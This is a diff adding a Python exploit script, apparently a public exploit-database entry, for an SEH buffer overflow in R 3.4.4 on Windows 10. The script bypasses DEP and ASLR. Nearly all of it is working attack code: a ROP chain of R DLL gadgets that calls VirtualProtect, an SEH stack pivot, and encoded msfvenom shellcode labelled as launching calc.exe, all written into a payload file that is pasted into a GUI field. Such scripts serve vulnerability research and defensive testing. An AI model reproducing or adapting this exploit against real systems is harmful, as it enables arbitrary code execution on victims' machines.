@@ -1,0 +1,82 @@
+#!/usr/bin/python
+# Exploit Title: R 3.4.4 (Windows 10 x64) - Buffer Overflow  SEH(DEP/ASLR Bypass)
+# Date: 2019-07-15
+# Exploit Author: blackleitus
+# Vendor Homepage: https://www.r-project.org/
+# Tested on: Windows 10 Home Single Language 64-bit
+# Social: https://twitter.com/blackleitus
+# Website: https://skybulk.github.io/
+# discovered by: bzyo
+
+
+# GUI Preferences -> paste payload.txt into 'Language for menus ...' -> click OK
+import struct 
+
+outfile = 'payload.txt'
+
+def create_rop_chain():
+    rop_gadgets = [
+       0x6c998f58,   # POP EAX # RETN [R.dll] 
+       0x6379973c,   # ptr to &VirtualProtect() [IAT methods.dll]
+       0x6fee2984,   # MOV EAX,DWORD PTR DS:[EAX] # RETN [grDevices.dll] 
+       0x6ca1ba76,   # XCHG EAX,ESI # RETN [R.dll] 
+       0x64c45cb8,   # POP ECX # RETN    ** [methods.dll] **   |   {PAGE_EXECUTE_READ}
+       0x64c46010,   # &Writable location [methods.dll]
+       0x6cacc7e2,   # POP EAX # RETN    ** [R.dll] **   |   {PAGE_EXECUTE_READ}
+       0xffffffc0,   # Value to negate, will become 0x00000040
+       0x7139c7ba,   # NEG EAX # RETN    ** [stats.dll] **   |   {PAGE_EXECUTE_READ}
+       0x6ca3485a,   # XCHG EAX,EDX # RETN    ** [R.dll] **   |   {PAGE_EXECUTE_READ}
+       0x7135a862,   # POP EAX # RETN    ** [stats.dll] **   |   {PAGE_EXECUTE_READ}
+       0xfffffdff,   # Value to negate, will become 0x00000201
+       0x6e7d41ca,   # NEG EAX # RETN    ** [utils.dll] **   |   {PAGE_EXECUTE_READ}
+       0x63742597,   # XCHG EAX,EBX # RETN    ** [Rgraphapp.dll] **   |   {PAGE_EXECUTE_READ}
+       0x6cbef3c0,   # POP EAX # RETN    ** [R.dll] **   |   {PAGE_EXECUTE_READ}
+       0x41414141,   # Filler (compensate)
+       0x6c9b1de7,   # POP EBP # RETN    ** [R.dll] **   |   {PAGE_EXECUTE_READ}
+       0x6ca2a9bd,   # & jmp esp [R.dll]
+       0x6cbebfa6,   # POP EAX # RETN    ** [R.dll] **   |   {PAGE_EXECUTE_READ}
+       0x90909090,   # nop
+       0x6ca00e93,   # POP EDI # RETN [R.dll] 
+       0x6375fe5c,   # RETN (ROP NOP) [Rgraphapp.dll]
+       0x6ff1b7bb,   # PUSHAD # RETN [grDevices.dll]
+    ]
+
+    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
+
+rop_chain = create_rop_chain()
+
+junk = "A" * 1016
+
+seh = struct.pack("<L", 0x6cb5f812) # 0x6cb5f812 : {pivot 2988 / 0xbac} :  # ADD ESP,0B9C # POP EBX # POP ESI # POP EDI # POP EBP # RETN    ** [R.dll] **   |   {PAGE_EXECUTE_READ}
+
+# msfvenom -a x86 -p windows/exec -e x86/shikata_ga_nai -b '\x00\x09\x0a\x0d' cmd=calc.exe exitfunc=thread -f python
+
+nops = struct.pack("<L", 0x6cacc7e3) * 30
+
+shellcode =  ""
+shellcode += "\x90" * 20
+shellcode += "\xdb\xce\xbf\x90\x28\x2f\x09\xd9\x74\x24\xf4\x5d\x29"
+shellcode += "\xc9\xb1\x31\x31\x7d\x18\x83\xc5\x04\x03\x7d\x84\xca"
+shellcode += "\xda\xf5\x4c\x88\x25\x06\x8c\xed\xac\xe3\xbd\x2d\xca"
+shellcode += "\x60\xed\x9d\x98\x25\x01\x55\xcc\xdd\x92\x1b\xd9\xd2"
+shellcode += "\x13\x91\x3f\xdc\xa4\x8a\x7c\x7f\x26\xd1\x50\x5f\x17"
+shellcode += "\x1a\xa5\x9e\x50\x47\x44\xf2\x09\x03\xfb\xe3\x3e\x59"
+shellcode += "\xc0\x88\x0c\x4f\x40\x6c\xc4\x6e\x61\x23\x5f\x29\xa1"
+shellcode += "\xc5\x8c\x41\xe8\xdd\xd1\x6c\xa2\x56\x21\x1a\x35\xbf"
+shellcode += "\x78\xe3\x9a\xfe\xb5\x16\xe2\xc7\x71\xc9\x91\x31\x82"
+shellcode += "\x74\xa2\x85\xf9\xa2\x27\x1e\x59\x20\x9f\xfa\x58\xe5"
+shellcode += "\x46\x88\x56\x42\x0c\xd6\x7a\x55\xc1\x6c\x86\xde\xe4"
+shellcode += "\xa2\x0f\xa4\xc2\x66\x54\x7e\x6a\x3e\x30\xd1\x93\x20"
+shellcode += "\x9b\x8e\x31\x2a\x31\xda\x4b\x71\x5f\x1d\xd9\x0f\x2d"
+shellcode += "\x1d\xe1\x0f\x01\x76\xd0\x84\xce\x01\xed\x4e\xab\xee"
+shellcode += "\x0f\x5b\xc1\x86\x89\x0e\x68\xcb\x29\xe5\xae\xf2\xa9"
+shellcode += "\x0c\x4e\x01\xb1\x64\x4b\x4d\x75\x94\x21\xde\x10\x9a"
+shellcode += "\x96\xdf\x30\xf9\x79\x4c\xd8\xd0\x1c\xf4\x7b\x2d"
+
+padding = "D" * (8000-1016-4-30-len(rop_chain)-len(shellcode))
+
+payload = junk + seh + nops + rop_chain + shellcode + padding
+
+with open(outfile, 'w') as file:
+  file.write(payload)
+print "payload File Created\n"
